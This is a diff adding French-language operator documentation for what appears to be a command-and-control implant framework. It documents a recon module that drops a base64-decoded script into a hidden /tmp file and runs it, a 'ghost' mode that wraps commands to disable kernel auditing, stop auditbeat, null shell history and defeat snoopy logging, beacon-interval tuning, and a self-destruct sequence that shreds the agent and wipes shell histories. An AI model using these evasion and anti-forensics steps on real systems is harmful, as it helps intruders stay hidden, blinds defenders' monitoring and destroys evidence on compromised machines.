@@ -404,6 +404,92 @@ Débit approximatif (C2_INT=30s) :
 
 Les tâches de chunks sont visibles dans la liste des tâches. Cliquer sur une tâche chunk affiche sa progression (`chunk X/N, Y reçus`). Le log se met à jour automatiquement quand le téléchargement est terminé.
 
+#### `/module recon [--obfuscate] [--delayer INT JITTER] [--renamer]`
+
+Exécute `phantom_eye.sh` sur l'agent. Toutes les options sont opt-in et se cumulent.
+
+```
+/module recon                                      # envoi brut
+/module recon --obfuscate                          # obfusqué via shadowscript
+/module recon --delayer 0.5 0.2                    # delays aléatoires entre les lignes
+/module recon --renamer                            # renomme le script avec un nom plausible
+/module recon --obfuscate --delayer 0.5 0.2 --renamer  # tout activé
+```
+
+Ordre d'application : delayer → obfuscate → renamer.
+
+Le script est base64-encodé et envoyé inline à l'agent :
+
+```bash
+echo '<b64>' | base64 -d > /tmp/.<hex8> && bash /tmp/.<hex8>; rm -f /tmp/.<hex8>
+```
+
+Sortie attendue : une ligne semicolon-delimited (format Phantom Eye) :
+
+```
+Ubuntu;22.04;5.15.0-127-generic;share1,share2;/export/nfs;my-bucket;mydb;;N/A;N/A
+```
+
+Durée d'exécution : ~10–30 s (phantom_eye sonde de nombreux services avec fallbacks).
+
+#### `/module ghost on|off|status`
+
+Active/désactive le mode fantôme sur **l'agent sélectionné uniquement** (état isolé par process).
+
+```
+/module ghost on       # active
+/module ghost off      # désactive
+/module ghost status   # affiche l'état courant
+```
+
+Quand actif, chaque commande shell suivante est wrappée avec le préambule EchoErase :
+
+1. `auditctl -e 0` — coupe l'audit kernel (root requis)
+2. `systemctl stop auditbeat` — stoppe auditbeat si présent
+3. Zeroing des variables d'historique shell (`HISTFILE=/dev/null`, `HISTSIZE=0`, etc.)
+4. Unset des empreintes SSH/sudo/terminal (`SSH_CLIENT`, `SUDO_USER`, variables d'émulateur)
+5. Neutralisation de snoopy (`LD_PRELOAD` vidé si snoopy détecté)
+6. `ulimit -c 0` — désactive les core dumps
+7. Restauration de l'audit et auditbeat après exécution
+
+Les commandes `UPLOAD:` et `WRITE:` ne sont **pas** wrappées (opérations fichier, pas shell).
+
+Persiste jusqu'à `/module ghost off` ou redémarrage de l'agent.
+
+#### `/module heartbeat INT JITTER`
+
+Modifie l'intervalle de beacon de l'agent à la volée, sans redémarrage.
+
+```
+/module heartbeat 60 15     # beacon toutes les 60s ± 15s
+/module heartbeat 5 2       # mode agressif pour tests
+/module heartbeat status    # affiche l'intervalle courant
+```
+
+Prend effet dès le prochain cycle de sleep. Utile pour ralentir un agent une fois une tâche longue lancée, ou accélérer temporairement pour récupérer un résultat rapidement.
+
+#### `/module suicide`
+
+Auto-destruction de l'agent et effacement des traces sur la cible. Affiche une confirmation avant d'envoyer.
+
+```
+/module suicide    # demande confirmation → envoie la commande → auto-supprime de la DB
+```
+
+Séquence d'exécution sur l'agent (2 s après envoi de `[suicide: ok]`) :
+
+1. `auditctl -e 0` — coupe l'audit kernel
+2. Zeroing des variables d'historique shell
+3. `shred -u <agent.py>` (fallback `rm -f`) — supprime le script agent
+4. `rm -rf <agent.pyc> __pycache__/` — supprime le bytecode compilé
+5. Shred/rm de `~/.bash_history`, `~/.zsh_history`, `~/.sh_history`, `~/.history`
+6. `find /tmp -maxdepth 1 -name '.*' -user $(id -nu) -delete` — supprime les scripts recon laissés dans `/tmp`
+7. `kill <pid>` — termine le process agent
+
+Côté TUI : dès réception de `[suicide: ok]`, l'agent est automatiquement supprimé de la base SQLite et du heartbeat Cloudflare (équivalent à `d`).
+
+> Root recommandé pour `shred` et `auditctl`. Sans root, `rm -f` remplace `shred` (pas d'écrasement sécurisé) et l'audit n'est pas coupé.
+
 ---
 
 ## Checklist de déploiement rapide
